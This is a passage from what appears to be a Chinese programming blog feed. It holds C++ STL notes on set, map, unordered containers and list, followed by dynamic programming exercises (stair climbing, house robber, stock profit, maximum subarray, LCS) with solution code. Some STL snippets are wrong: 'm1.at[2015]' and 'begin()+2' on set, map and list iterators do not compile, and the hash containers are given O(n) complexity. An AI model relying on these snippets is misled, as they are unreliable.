class="line">c1.upper_bound(elem);   <span class="comment">//返回指向首个大于elem的迭代器</span></span><br><span class="line"></span><br><span class="line">c1.insert(elem);    <span class="comment">//插入单个elem</span></span><br><span class="line">c1.insert(c2.<span class="built_in">begin</span>(), c2.<span class="built_in">end</span>());    <span class="comment">//插入另一个set的某个区间</span></span><br><span class="line">c1.erase(elem);  <span class="comment">//返回被移除的元素的数量</span></span><br><span class="line">c1.erase(iter);  <span class="comment">//清除iter指向的元素</span></span><br><span class="line">c1.erase(c1.<span class="built_in">begin</span>()+<span class="number">2</span>, c1.<span class="built_in">begin</span>()+<span class="number">5</span>);   <span class="comment">//清除某个区间</span></span><br></pre></td></tr></table></figure><h2 id="unordered-set-unordered-multiset"><a href="#unordered-set-unordered-multiset" class="headerlink" title="unordered_set/unordered_multiset"></a>unordered_set/unordered_multiset</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//基于哈希表实现，插入O(n)，查找O(n)，删除O(n)</span></span><br><span class="line"><span class="comment">//代价占用内存比set/multiset略大一点点，内部元素不排序</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//大部分函数同set/multiset</span></span><br><span class="line"><span class="comment">//由于内部元素不排序，不能使用lower_bound和upper_bound</span></span><br></pre></td></tr></table></figure><h2 id="map-multimap"><a href="#map-multimap" class="headerlink" title="map/multimap"></a>map/multimap</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//基于红黑树实现，依据key自动排序，插入O(logn)，查找O(logn)，删除O(logn)</span></span><br><span class="line"><span class="comment">//也导致无法直接修改map中的元素，只能先删除再插入</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">int</span>, <span class="built_in">string</span>&gt; m1 = &#123;&#123;<span class="number">2015</span>, <span class="string">"Tom"</span>&#125;, &#123;<span class="number">2016</span>, <span class="string">"Jim"</span>&#125;&#125;;   <span class="comment">//构造函数</span></span><br><span class="line"></span><br><span class="line">m1.<span class="built_in">clear</span>();   <span class="comment">//清空</span></span><br><span class="line">m1.<span class="built_in">size</span>();   <span class="comment">//返回元素数量</span></span><br><span class="line">m1.empty();  <span class="comment">//是否为空</span></span><br><span class="line"></span><br><span class="line">m1.at[<span class="number">2015</span>] = <span class="string">"Tom"</span>;    <span class="comment">//取值，会检查key是否存在</span></span><br><span class="line">m1[<span class="number">2015</span>] = <span class="string">"Tom"</span>;   <span class="comment">//若key存在则修改value，若不存在则创建</span></span><br><span class="line"></span><br><span class="line">m1.count(key);     <span class="comment">//返回相应key的count，可以用于判断map中是否存在该key</span></span><br><span class="line">iter = m1.<span class="built_in">find</span>(key);   <span class="comment">//返回指向key的迭代器，用"!=m1.end()"判断是否找到</span></span><br><span class="line">c1.lower_bound(key);   <span class="comment">//返回指向首个不小于key的迭代器</span></span><br><span class="line">c1.upper_bound(key);   <span class="comment">//返回指向首个大于key的迭代器</span></span><br><span class="line"></span><br><span class="line">m1.insert(make_pair(<span class="number">2015</span>, <span class="string">"Tom"</span>));  <span class="comment">//使用pair插入</span></span><br><span class="line">m1.insert(pair&lt;<span class="keyword">int</span>, <span class="built_in">string</span>&gt;(<span class="number">2015</span>, <span class="string">"Tom"</span>));</span><br><span class="line">m1.insert(&#123;<span class="number">2015</span>, <span class="string">"Tom"</span>&#125;);   <span class="comment">//initializer_list插入</span></span><br><span class="line">m1.erase(key);  <span class="comment">//返回被移除的元素的数量</span></span><br><span class="line">m1.erase(iter);  <span class="comment">//清除iter指向的元素</span></span><br><span class="line">m1.erase(m1.<span class="built_in">begin</span>()+<span class="number">2</span>, m1.<span class="built_in">begin</span>()+<span class="number">5</span>);   <span class="comment">//清除某个区间</span></span><br></pre></td></tr></table></figure><h2 id="unordered-map-unordered-multimap"><a href="#unordered-map-unordered-multimap" class="headerlink" title="unordered_map/unordered_multimap"></a>unordered_map/unordered_multimap</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//基于哈希表实现，插入O(n)，查找O(n)，删除O(n)</span></span><br><span class="line"><span class="comment">//代价占用内存比map/multimap略大一点点，内部元素不排序</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//大部分函数同map/multimap</span></span><br><span class="line"><span class="comment">//由于内部元素不排序，不能使用lower_bound和upper_bound</span></span><br></pre></td></tr></table></figure><h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; l1 = l2;  <span class="comment">//深拷贝构造</span></span><br><span class="line"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; l1 = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;  <span class="comment">//initializer_list初始化</span></span><br><span class="line"><span class="function"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; <span class="title">l1</span><span class="params">(l2.<span class="built_in">begin</span>(), l2.<span class="built_in">end</span>())</span></span>;  </span><br><span class="line"><span class="function"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; <span class="title">l1</span><span class="params">(<span class="number">7</span>)</span></span>;  <span class="comment">//初始化有7个元素的list</span></span><br><span class="line"><span class="function"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; <span class="title">l1</span><span class="params">(<span class="number">7</span>, <span class="number">3</span>)</span>    <span class="comment">//初始化有7个3的list</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">l1.clear();     //清空</span><br><span class="line">l1.<span class="built_in">size</span>();   <span class="comment">//返回元素数量</span></span><br><span class="line">l1.empty();  <span class="comment">//是否为空</span></span><br><span class="line"></span><br><span class="line">l1.front();     <span class="comment">//访问第一个元素</span></span><br><span class="line">l1.back();      <span class="comment">//访问最后一个元素</span></span><br><span class="line"></span><br><span class="line">l1.push_back(<span class="number">100</span>);  <span class="comment">//末尾插入元素</span></span><br><span class="line">l1.pop_back();  <span class="comment">//清除末尾元素</span></span><br><span class="line"></span><br><span class="line">iter = l1.insert(l1.<span class="built_in">begin</span>(), <span class="number">100</span>);  <span class="comment">//在vector最前面插入100</span></span><br><span class="line">iter = l1.insert(l1.<span class="built_in">begin</span>(), l2.<span class="built_in">begin</span>(), l2.<span class="built_in">end</span>());  <span class="comment">//插入另一个数组</span></span><br><span class="line">iter = l1.erase(l1.<span class="built_in">begin</span>()+<span class="number">2</span>);  <span class="comment">//erase一个数</span></span><br><span class="line">iter = l1.erase(l1.<span class="built_in">begin</span>()+<span class="number">2</span>, l1.<span class="built_in">begin</span>()+<span class="number">5</span>);    <span class="comment">//erase一个区间</span></span><br></pre></td></tr></table></figure><h2 id="基础输入输出"><a href="#基础输入输出" class="headerlink" title="基础输入输出"></a>基础输入输出</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> str;</span><br><span class="line"><span class="built_in">std</span>::getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, str);  <span class="comment">//会把'\n'去除</span></span><br><span class="line"><span class="built_in">std</span>::getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, str, <span class="string">' '</span>);  <span class="comment">//设置分隔符，此时将空格视为一行的结束，'\n'会被读入</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">立即在空白符分隔输入后使用时，例如在 int n; std::cin &gt;&gt; n; 后， getline 会用 operator&gt;&gt; 消耗掉留在输入流上的换行符，并立即返回。</span></span><br><span class="line"><span class="comment">常用解决方案是在切换到面向行输入前，用 cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), '\n'); 忽略输入行上所有剩下的字符。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sort(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(),</span><br><span class="line">        [](<span class="keyword">const</span> <span class="keyword">int</span>&amp; a, <span class="keyword">const</span> <span class="keyword">int</span>&amp; b) &#123;</span><br><span class="line">            <span class="keyword">return</span> a &lt; b;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划</title>
      <link href="/2020/11/07/dongtaiguihua/"/>
      <url>/2020/11/07/dongtaiguihua/</url>
      
        <content type="html"><![CDATA[<blockquote><p>动态规划入门，也算是考试复习⑧</p></blockquote><a id="more"></a><h2 id="跳台阶"><a href="#跳台阶" class="headerlink" title="跳台阶"></a>跳台阶</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>多组测试样例。每组测试样例包含一个整数n。(1&lt;=n&lt;=100)</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>每组测试样例输出一行，表示青蛙跳上n级台阶的跳法数量.</p><p>所得到的结果模1000000007</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>动态规划 dp[n]=dp[n-1]+dp[n-2] 跳到第n阶的方法等于跳到第n-1阶再跳一次加上跳到第n-2阶再跳两阶。dp[1]=1;dp[0]=1;dp[2]=2;</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//动态规划入门题，跳台阶</span></span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; <span class="number">100</span>;++i)&#123;</span><br><span class="line">        dp[i] = (dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>]) % <span class="number">1000000007</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; dp[n] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="打家劫舍"><a href="#打家劫舍" class="headerlink" title="打家劫舍"></a>打家劫舍</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警。</p><p>给定一个代表每个房屋存放金额的非负整数数组，计算你 不触动警报装置的情况下 ，一夜之内能够偷窃到的最高金额。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">示例 1：</span><br><span class="line"></span><br><span class="line">输入：[1,2,3,1]</span><br><span class="line">输出：4</span><br><span class="line">解释：偷窃 1 号房屋 (金额 &#x3D; 1) ，然后偷窃 3 号房屋 (金额 &#x3D; 3)。</span><br><span class="line">     偷窃到的最高金额 &#x3D; 1 + 3 &#x3D; 4 。</span><br><span class="line">示例 2：</span><br><span class="line"></span><br><span class="line">输入：[2,7,9,3,1]</span><br><span class="line">输出：12</span><br><span class="line">解释：偷窃 1 号房屋 (金额 &#x3D; 2), 偷窃 3 号房屋 (金额 &#x3D; 9)，接着偷窃 5 号房屋 (金额 &#x3D; 1)。</span><br><span class="line">     偷窃到的最高金额 &#x3D; 2 + 9 + 1 &#x3D; 12 。</span><br><span class="line">提示：</span><br><span class="line"></span><br><span class="line">0 &lt;&#x3D; nums.length &lt;&#x3D; 100</span><br><span class="line">0 &lt;&#x3D; nums[i] &lt;&#x3D; 400</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/house-robber" target="_blank" rel="noopener">https://leetcode-cn.com/problems/house-robber</a></p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>动态规划 ，偷最后一间，最大金额等于前面max dp[n-2]+最后一间 ，偷倒数第二间就等于max dp[n-1]；</p><p><a href="https://leetcode-cn.com/problems/house-robber/solution/dong-tai-gui-hua-jie-ti-si-bu-zou-xiang-jie-cjavap/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/house-robber/solution/dong-tai-gui-hua-jie-ti-si-bu-zou-xiang-jie-cjavap/</a></p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rob</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(nums.<span class="built_in">size</span>()==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    dp[<span class="number">1</span>] = nums[<span class="number">0</span>];</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= nums.<span class="built_in">size</span>();++i)&#123;</span><br><span class="line">        dp[i] = <span class="built_in">max</span>(dp[i - <span class="number">2</span>] + nums[i<span class="number">-1</span>], dp[i - <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[nums.<span class="built_in">size</span>()];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">a</span><span class="params">(n,<span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;++i)&#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; rob(a) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="买卖股票的最佳时机"><a href="#买卖股票的最佳时机" class="headerlink" title="买卖股票的最佳时机"></a>买卖股票的最佳时机</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。</p><p>如果你最多只允许完成一笔交易（即买入和卖出一支股票一次），设计一个算法来计算你所能获取的最大利润。</p><p>注意：你不能在买入股票前卖出股票。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock" target="_blank" rel="noopener">https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock</a></p><h3 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">示例 1:</span><br><span class="line"></span><br><span class="line">输入: [7,1,5,3,6,4]</span><br><span class="line">输出: 5</span><br><span class="line">解释: 在第 2 天（股票价格 &#x3D; 1）的时候买入，在第 5 天（股票价格 &#x3D; 6）的时候卖出，最大利润 &#x3D; 6-1 &#x3D; 5 。</span><br><span class="line">     注意利润不能是 7-1 &#x3D; 6, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。</span><br><span class="line">示例 2:</span><br><span class="line"></span><br><span class="line">输入: [7,6,4,3,1]</span><br><span class="line">输出: 0</span><br><span class="line">解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。</span><br></pre></td></tr></table></figure><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>最低点买入 ，最低点后面的最高点卖出。记录每个区间的最大值的最大值。动态规划</p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(prices.<span class="built_in">size</span>()&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> maxl = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> minl = <span class="number">10000000</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; prices.<span class="built_in">size</span>();++i)&#123;</span><br><span class="line">        maxl = <span class="built_in">max</span>(maxl, prices[i] - minl);</span><br><span class="line">        minl = <span class="built_in">min</span>(minl, prices[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最大子段和"><a href="#最大子段和" class="headerlink" title="最大子段和"></a>最大子段和</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。</p><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。</p><p>每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。</p><p>接下来一行有n个数x(-1000&lt;=x&lt;=1000)。</p><h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>输出其对应的最大子段和。</p><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">6</span><br><span class="line">2 -11 4 13 -1 2</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18</span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>子段可为空集，答案为0</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>前面的和大于0，则加上，小于0则抛弃</p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">10005</span>];</span><br><span class="line"><span class="keyword">int</span> s[<span class="number">10005</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">        <span class="keyword">int</span> sum=<span class="number">0x80000000</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;++i)&#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; s[i];</span><br><span class="line">            <span class="keyword">if</span>(dp[i]&gt;<span class="number">0</span>)</span><br><span class="line">                dp[i + <span class="number">1</span>] = dp[i] + s[i];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i + <span class="number">1</span>] = s[i];</span><br><span class="line">                sum = <span class="built_in">max</span>(dp[i + <span class="number">1</span>], sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。<br>例如：Z=&lt;a,b,f,c&gt;是序列X=&lt;a,b,c,f,b,c&gt;的一个子序列，Z中的元素在X中的下标序列为&lt;1,2,4,6&gt;。<br>现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？</p><h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。</p><h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>对于每组输入，输出两个字符串的最长公共子序列的长度。</p><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abcfbc abfcab</span><br><span class="line">programming contest </span><br><span class="line">abcd mnp</span><br></pre></td></tr></table></figure><h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">2</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">105</span>][<span class="number">105</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span 